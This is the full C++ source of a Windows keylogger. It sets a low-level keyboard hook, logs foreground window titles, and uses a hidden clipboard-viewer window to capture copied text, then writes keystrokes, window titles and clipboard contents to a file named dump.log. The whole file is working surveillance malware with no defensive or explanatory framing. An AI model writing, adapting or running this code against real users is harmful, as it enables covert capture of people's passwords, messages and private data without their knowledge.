#define _CRT_SECURE_NO_WARNINGS
#define no_init_all
#include <iostream>
#include <fstream>
#include <vector>
#include <Windows.h>

#define ENABLE_DBG_PRINT	0				// Enable/disable stdout prints
#define PATH				L"dump.log"		// Path for output file
#define DELAY				10000			// Delay in ms for WaitForSingleObject

#if ENABLE_DBG_PRINT
#define DebugPrint(x) std::wcout << x << std::endl;
#else
#define DebugPrint(x) do {} while (0)
#endif

#define ErrorPrint(x) \
	do { \
		std::wcerr << "Error at line " << __LINE__ << ": " << x << " (Error code: " << GetLastError() << ")" << std::endl; \
	} while (0)

enum class StringType {
	WINDOW,
	KEY,
	CLIPBOARD
};
using Element = std::pair<std::wstring, StringType>;
std::vector<Element> records;

HHOOK hHook;
HWND hWndNextViewer = nullptr;

// Thread function to log clipboard data
DWORD WINAPI LogClipboardData(LPVOID lpParam);
LRESULT CALLBACK ClipboardViewerProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);

// Thread function to log changes in the foreground window
DWORD WINAPI LogForegroundWindow(LPVOID lpParam);

// Thread function to log keyboard input events
DWORD WINAPI LogKeystrokes(LPVOID lpParam);
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);


int main()
{
	DWORD dwThreadId;
	HANDLE hThread, foregroundThread, clipboardThread;

	// 1. Thread that logs clipboard data
	clipboardThread = CreateThread(NULL, 0, LogClipboardData, NULL, 0, &dwThreadId);
	if (clipboardThread == NULL)
	{
		ErrorPrint(L"CreateThread");
		ExitProcess(1);
	}

	// 2. Thread that logs foreground windows
	foregroundThread = CreateThread(NULL, 0, LogForegroundWindow, NULL, 0, &dwThreadId);
	if (foregroundThread == NULL)
	{
		ErrorPrint(L"CreateThread");
		ExitProcess(1);
	}

	// 3. Thread that logs keyboard input events
	hThread = CreateThread(NULL, 0, LogKeystrokes, NULL, 0, &dwThreadId);
	if (hThread == NULL)
	{
		ErrorPrint(L"CreateThread");
		ExitProcess(1);
	}

	// 4. Wait for the threads and cleanup
	WaitForSingleObject(hThread, DELAY);
	WaitForSingleObject(foregroundThread, DELAY);
	WaitForSingleObject(clipboardThread, DELAY);
	CloseHandle(hThread);
	CloseHandle(foregroundThread);
	CloseHandle(clipboardThread);
	UnhookWindowsHookEx(hHook);

	// 5. Write recorded data to the output file
	std::wofstream outputFile(PATH);
	if (!outputFile.is_open())
	{
		ErrorPrint(L"outputfile");
		return 0;
	}

	for (const auto& element : records)
	{
		if (element.second == StringType::WINDOW)
			outputFile << L"----------------------------------------------------\nCurrent Window = " << element.first.c_str() << std::endl;
		else if (element.second == StringType::CLIPBOARD)
			outputFile << L"Clipboard context changed. Text = " << element.first.c_str() << std::endl;
		else if (element.second == StringType::KEY)
			outputFile << L"Recorded keys = " << element.first.c_str() << std::endl;
	}
	outputFile << L"----------------------------------------------------" << std::endl;
	outputFile.close();

	return 0;
}

DWORD WINAPI LogKeystrokes(LPVOID lpParam)
{
	// Set hook for keyboard inout events
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	// Infinite loop that retrieves messages from queue
	while (GetMessageA(0, 0, 0, 0));

	return 0;
}

LRESULT CALLBACK KeyboardHook( int nCode, WPARAM wParam, LPARAM lParam )
{
	// Extract information about the keyboard event
	LPKBDLLHOOKSTRUCT kInfo = (LPKBDLLHOOKSTRUCT)lParam;
	LONG msg = 1 + (kInfo->scanCode << 16) + (kInfo->flags << 24);
	DWORD vkCode = kInfo->vkCode;
	wchar_t keyName[64];

	// Convert virtual key code to a human-readable key name
	GetKeyNameTextW((LONG)msg, keyName, sizeof keyName);

	// Process the keyboard event based on the message type
	switch (wParam)
	{
		case WM_KEYDOWN:
			records.push_back(std::make_pair(keyName, StringType::KEY));
			DebugPrint(L"Captured: " << keyName);
			break;
	}

	// Pass the event to the next hook in the chain
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI LogForegroundWindow( LPVOID lpParam )
{
	HWND currentWnd = nullptr;

	// Continuously loop to monitor changes in the foreground window
	while (true)
	{
		// Get the handle of the currently window
		HWND newWnd = GetForegroundWindow();
		
		// Check if the foreground window has changed
		if (newWnd != currentWnd)
		{
			// Update the current window and retrieve its title
			currentWnd = newWnd;
			wchar_t title[MAX_PATH];
			GetWindowTextW(currentWnd, title, MAX_PATH);
			if (title != nullptr && wcslen(title) > 0)
			{
				records.push_back(std::make_pair(title, StringType::WINDOW));
				DebugPrint(L"Foreground window changed. Title: " << title);
			}
		}
	}
}

DWORD WINAPI LogClipboardData(LPVOID lpParam)
{
	// Register a window class for the clipboard viewer
	WNDCLASS wc = {};
	wc.lpfnWndProc = ClipboardViewerProc;
	wc.hInstance = GetModuleHandle(nullptr);
	wc.lpszClassName = L"ClipboardViewerClass";
	RegisterClass(&wc);

	// Create a window for the clipboard viewer (invisible)
	HWND hWndViewer = CreateWindowEx(0, L"ClipboardViewerClass", L"Clipboard Viewer", 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr);

	// Set the viewer in the clipboard viewer chain
	hWndNextViewer = SetClipboardViewer(hWndViewer);

	// Run the message loop for this thread
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Remove the viewer from the clipboard viewer chain
	ChangeClipboardChain(hWndViewer, hWndNextViewer);

	return 1;
}

LRESULT CALLBACK ClipboardViewerProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_DRAWCLIPBOARD:
		// Clipboard content changed
		DebugPrint(L"Clipboard content changed");

		if (OpenClipboard(hWnd))
		{
			HANDLE hClipboardData = GetClipboardData(CF_UNICODETEXT);

			if (hClipboardData != nullptr)
			{
				wchar_t* clipboardText = static_cast<wchar_t *>(GlobalLock(hClipboardData));
				if (clipboardText != nullptr && wcslen(clipboardText) > 0)
				{
					records.push_back(std::make_pair(clipboardText, StringType::CLIPBOARD));
					DebugPrint(L"Clipboard Text: " << clipboardText);
					GlobalUnlock(hClipboardData);
				}
			}

			CloseClipboard();
		}

		// Forward the message to the next viewer in the chain
		SendMessage(hWndNextViewer, message, wParam, lParam);
		break;

	case WM_CHANGECBCHAIN:
		// The next viewer's window handle is being removed
		if (reinterpret_cast<HWND>(wParam) == hWndNextViewer)
		{
			hWndNextViewer = reinterpret_cast<HWND>(lParam);
		}
		else if (hWndNextViewer != nullptr)
		{
			// Forward the message to the next viewer in the chain
			SendMessage(hWndNextViewer, message, wParam, lParam);
		}
		break;

	default:
		// Process other messages
		return DefWindowProc(hWnd, message, wParam, lParam);
	}

	return 0;
}